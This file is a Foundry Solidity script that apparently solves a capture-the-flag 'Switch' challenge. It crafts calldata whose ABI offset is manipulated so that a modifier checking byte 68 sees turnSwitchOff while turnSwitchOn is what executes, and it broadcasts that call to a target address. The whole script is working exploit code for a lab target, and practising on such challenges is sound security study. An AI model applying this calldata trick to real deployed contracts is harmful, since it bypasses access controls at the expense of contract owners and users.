// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import {Switch} from "../src/Switch.sol";

contract SolveSwitch is Script {
    Switch public switchContract;

    function setUp() public {}

    function run() public {
        vm.startBroadcast();

        switchContract = Switch(vm.envAddress("SWITCH_ADDRESS"));

        bytes memory maliciousCalldata = craftMaliciousCalldata();

        // Call flipSwitch with our crafted calldata
        (bool success,) = address(switchContract).call(maliciousCalldata);
        require(success, "Attack failed");

        vm.stopBroadcast();
    }

    function craftMaliciousCalldata() internal pure returns (bytes memory) {
        // We need to craft calldata that:
        // 1. Has turnSwitchOff() selector at byte 68 (to pass onlyOff check)
        // 2. Has turnSwitchOn() selector as the actual data to be called

        bytes4 flipSwitchSelector = bytes4(keccak256("flipSwitch(bytes)"));
        bytes4 turnSwitchOnSelector = bytes4(keccak256("turnSwitchOn()"));
        bytes4 turnSwitchOffSelector = bytes4(keccak256("turnSwitchOff()"));

        // Build the calldata manually
        bytes memory data = abi.encodePacked(
            flipSwitchSelector, // 0-3:   flipSwitch selector
            uint256(0x60), // 4-35:  offset to _data (96 bytes, points to byte 100)
            turnSwitchOffSelector, // 36-39: padding
            bytes28(0), // 40-67: padding
            turnSwitchOffSelector, // 68-71: turnSwitchOff (checked by modifier) ✅
            bytes28(0), // 72-99: padding
            uint256(0x04), // 100-131: length of _data (4 bytes)
            turnSwitchOnSelector // 132-135: actual data (turnSwitchOn) 🎯
        );

        return data;
    }
}
